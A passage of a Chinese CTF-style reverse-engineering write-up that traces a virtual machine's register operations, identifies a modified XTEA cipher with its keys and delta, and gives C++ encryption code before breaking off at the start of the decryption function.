class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2ff</span>b62c800\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5ff</span>6c59 <span class=\"token operator\">^</span> fb62c800 <span class=\"token operator\">=</span> fe9da459\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> aecfb864\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fe9da459 <span class=\"token operator\">+</span> aecfb864 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>ad6d5cbd\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">=</span> f4ef03ef\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f4ef03ef <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>4411fd\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> ad6d5cbd <span class=\"token operator\">^</span> <span class=\"token number\">5f</span>4411fd <span class=\"token operator\">=</span> f2294d40\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f2294d40 <span class=\"token operator\">+</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">=</span> <span class=\"token number\">1703</span>addbe\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">703</span>addb\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">381</span>d6edf00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addb <span class=\"token operator\">^</span> <span class=\"token number\">1</span>d6edf00 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>a6d72db\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">255</span>caa36\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>a6d72db <span class=\"token operator\">+</span> <span class=\"token number\">255</span>caa36 <span class=\"token operator\">=</span> <span class=\"token number\">3f</span>ca1d11\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dcdf8283 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1</span>b9bf0\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>b9bf0 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> dcdf8283 <span class=\"token operator\">=</span> <span class=\"token number\">1544</span>eead6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">544</span>eead6 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">776</span>dbfb0\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776</span>dbfb0 <span class=\"token operator\">^</span> <span class=\"token number\">3f</span>ca1d11 <span class=\"token operator\">=</span> <span class=\"token number\">48</span>a7a2a1\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">48</span>a7a2a1 <span class=\"token operator\">+</span> bfed8b20 <span class=\"token operator\">=</span> <span class=\"token number\">108952</span>dc1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">44</span>a96e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2254</span>b7040\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">44</span>a96e <span class=\"token operator\">^</span> <span class=\"token number\">254</span>b7040 <span class=\"token operator\">=</span> <span class=\"token number\">250f</span>d92e\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">19</span>b71e85\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">250f</span>d92e <span class=\"token operator\">+</span> <span class=\"token number\">19</span>b71e85 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>ec6f7b3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dcdf8283 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> dcdf8283 <span class=\"token operator\">=</span> <span class=\"token number\">15148e7</span>e7\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5148e7</span>e7 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> fae3f5f5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>ec6f7b3 <span class=\"token operator\">^</span> fae3f5f5 <span class=\"token operator\">=</span> c4250246\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> c4250246 <span class=\"token operator\">+</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">=</span> <span class=\"token number\">1345f</span>e004\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">345f</span>e00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>a2ff00200\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e00 <span class=\"token operator\">^</span> <span class=\"token number\">2ff</span>00200 <span class=\"token operator\">=</span> <span class=\"token number\">2</span>cb5fc00\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">6139978</span>c\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">2</span>cb5fc00 <span class=\"token operator\">+</span> <span class=\"token number\">6139978</span>c <span class=\"token operator\">=</span> <span class=\"token number\">8</span>def938c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">787</span>ed\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">787</span>ed <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">=</span> a1aacad7\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> a1aacad7 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">82899f</span>b1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">82899f</span>b1 <span class=\"token operator\">^</span> <span class=\"token number\">8</span>def938c <span class=\"token operator\">=</span> f660c3d\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f660c3d <span class=\"token operator\">+</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">=</span> <span class=\"token number\">17f</span>b39fe\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> bfd9cf\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>ece7f80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfd9cf <span class=\"token operator\">^</span> fece7f80 <span class=\"token operator\">=</span> fe71a64f\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>d90aba\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fe71a64f <span class=\"token operator\">+</span> <span class=\"token number\">6</span>d90aba <span class=\"token operator\">=</span> <span class=\"token number\">1054</span>ab109\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">=</span> <span class=\"token number\">9</span>dacc8dc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>dacc8dc <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">3607</span>dace\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">54</span>ab109 <span class=\"token operator\">^</span> <span class=\"token number\">3607</span>dace <span class=\"token operator\">=</span> <span class=\"token number\">334</span>d6bc7\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">334</span>d6bc7 <span class=\"token operator\">+</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">=</span> <span class=\"token number\">67</span>ad4bcb\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">67</span>ad4bc\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">33</span>d6a5e580\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bc <span class=\"token operator\">^</span> d6a5e580 <span class=\"token operator\">=</span> d0df313c\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span>cb3c43\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d0df313c <span class=\"token operator\">+</span> <span class=\"token number\">32</span>cb3c43 <span class=\"token operator\">=</span> <span class=\"token number\">103</span>aa6d7f\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1373</span>ea\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1373</span>ea <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">=</span> fd0cafc3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fd0cafc3 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> de2ffaa5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> de2ffaa5 <span class=\"token operator\">^</span> <span class=\"token number\">3</span>aa6d7f <span class=\"token operator\">=</span> dd8597da\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dd8597da <span class=\"token operator\">+</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">=</span> f580d1d8\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span>ac068e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>d60347600\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>ac068e <span class=\"token operator\">^</span> <span class=\"token number\">60347600</span> <span class=\"token operator\">=</span> <span class=\"token number\">6798708</span>e\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> e4a2e29c\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6798708</span>e <span class=\"token operator\">+</span> e4a2e29c <span class=\"token operator\">=</span> <span class=\"token number\">14</span>c3b532a\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">=</span> <span class=\"token number\">1010</span>ab1be\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">10</span>ab1be <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> aaa1a3ac\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span>c3b532a <span class=\"token operator\">^</span> aaa1a3ac <span class=\"token operator\">=</span> e69af086\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e69af086 <span class=\"token operator\">+</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">=</span> <span class=\"token number\">14e483</span>c51\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">4e483</span>c5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">27241e2880</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c5 <span class=\"token operator\">^</span> <span class=\"token number\">241e2880</span> <span class=\"token operator\">=</span> <span class=\"token number\">20f</span>aab45\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>b2e4bd9\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">20f</span>aab45 <span class=\"token operator\">+</span> <span class=\"token number\">1</span>b2e4bd9 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>c28f71e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> faff3738 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1f</span>5fe6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1f</span>5fe6 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> faff3738 <span class=\"token operator\">=</span> <span class=\"token number\">15</span>c6c96aa\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5</span>c6c96aa <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">7f</span>4fc3cc\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7f</span>4fc3cc <span class=\"token operator\">^</span> <span class=\"token number\">3</span>c28f71e <span class=\"token operator\">=</span> <span class=\"token number\">436734</span>d2\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">436734</span>d2 <span class=\"token operator\">+</span> f580d1d8 <span class=\"token operator\">=</span> <span class=\"token number\">138e806</span>aa</code></pre>\n\n<p>通过观察可以发现是一个魔改的XTea加密。</p>\n<p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p>\n<p>写出对应加密的c++代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">encipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">+=</span> tmp2<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">+=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">+=</span> tmp4<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span 